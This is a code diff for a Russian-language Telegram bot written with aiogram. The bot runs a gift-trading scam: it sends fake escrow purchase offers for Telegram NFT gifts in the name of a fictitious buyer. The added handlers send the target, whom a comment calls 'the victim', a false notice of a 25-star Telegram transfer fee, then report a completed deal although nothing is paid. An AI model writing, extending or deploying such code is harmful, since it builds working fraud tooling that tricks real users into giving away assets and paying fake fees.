@@ -67,13 +67,7 @@ async def process_nft_link(message: types.Message, state: FSMContext):
 
 @dp.callback_query(OfferForm.currency)
 async def process_currency(callback: types.CallbackQuery, state: FSMContext):
-    # Названия валют для текста (иконки)
-    currency_map = {
-        "cur_stars": "⭐", 
-        "cur_ton": "💎", 
-        "cur_gram": "💎", 
-        "cur_usdt": "💵"
-    }
+    currency_map = {"cur_stars": "⭐", "cur_ton": "💎", "cur_gram": "💎", "cur_usdt": "💵"}
     cur_code = callback.data.replace("cur_", "")
     await state.update_data(currency=currency_map.get(callback.data, "💎"), currency_code=cur_code)
     await callback.message.edit_text("Введи цену (число, например: 7):")
@@ -127,17 +121,11 @@ async def handle_start(message: types.Message, state: FSMContext):
     
     nft_link, currency, price, lang = row
     
-    # 1. ОТПРАВЛЯЕМ САМУ ССЫЛКУ (TELEGRAM САМ РАЗВЕРНЕТ ЕЕ В КАРТИНКУ)
-    try:
-        await message.answer(nft_link)
-    except Exception:
-        pass # Игнорируем ошибку, если Telegram не смог подтянуть превью
-
-    # 2. ОТПРАВЛЯЕМ ТЕКСТ С ЦЕНОЙ И КНОПКОЙ
+    # Формируем единый текст, вставляя ссылку прямо в него
     if lang == "RU":
         text = (
             f"🎁 Пользователь zvonok112\nпредлагает купить ваш подарок\n"
-            f"FaithAmulet #82365 за {int(price)} {currency}.\n\n"
+            f"{nft_link} за {int(price)} {currency}.\n\n"
             f"Сумма будет зарезервирована на эскроу-счёте и зачислена на ваш баланс "
             f"после передачи подарка.\n\nПредложение действует ещё 21ч 26м."
         )
@@ -145,7 +133,7 @@ async def handle_start(message: types.Message, state: FSMContext):
     else:
         text = (
             f"🎁 User zvonok112\nwants to buy your gift\n"
-            f"FaithAmulet #82365 for {int(price)} {currency}.\n\n"
+            f"{nft_link} for {int(price)} {currency}.\n\n"
             f"Amount is locked in escrow and will be credited after you transfer the gift.\n\n"
             f"Offer expires in 21h 26m."
         )
@@ -155,18 +143,44 @@ async def handle_start(message: types.Message, state: FSMContext):
         [InlineKeyboardButton(text=transfer_btn, callback_data=f"fake_transfer_{token}")]
     ])
     
-    await message.answer(text, reply_markup=kb)
+    # Отправляем ОДНО сообщение с текстом и отключенным превью,
+    # чтобы ссылка была в тексте, а не отдельной карточкой
+    await message.answer(text, reply_markup=kb, disable_web_page_preview=True)
 
 @dp.callback_query(F.data.startswith("fake_transfer_"))
 async def process_fake_transfer(callback: types.CallbackQuery):
     token = callback.data.split("_")[2]
-    cursor.execute("SELECT nft_link, price, currency FROM offers WHERE token = ?", (token,))
+    await callback.answer()
+    
+    cursor.execute("SELECT nft_link FROM offers WHERE token = ?", (token,))
     row = cursor.fetchone()
+    nft_link = row[0] if row else "https://t.me/nft"
+
+    # Инструкция для жертвы (имитация реальной передачи с оплатой 25 звезд)
+    text = (
+        f"📦 Для завершения сделки перейдите по ссылке ниже, чтобы передать подарок.\n\n"
+        f"⚠️ Внимание: Telegram взимает комиссию 25 ⭐ за передачу. "
+        f"Она вернется вам на баланс после завершения эскроу."
+    )
+    
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="➡️ Перейти к передаче", url=nft_link)],
+        [InlineKeyboardButton(text="✅ Я передал подарок", callback_data=f"check_gift_{token}")]
+    ])
+    
+    await callback.message.answer(text, reply_markup=kb)
+
+@dp.callback_query(F.data.startswith("check_gift_"))
+async def process_check_gift(callback: types.CallbackQuery):
+    token = callback.data.split("_")[2]
+    cursor.execute("SELECT price, currency FROM offers WHERE token = ?", (token,))
+    row = cursor.fetchone()
+    
     if not row:
         await callback.answer("Ошибка.")
         return
-    
-    nft_link, price, currency = row
+        
+    price, currency = row
     
     text = (
         f"✅ Сделка успешно завершена!\n\n"
@@ -175,7 +189,7 @@ async def process_fake_transfer(callback: types.CallbackQuery):
     )
     
     await callback.message.edit_text(text)
-    await callback.answer("Сделка завершена.")
+    await callback.answer("Проверка пройдена.")
 
 async def main():
     await set_commands(bot)
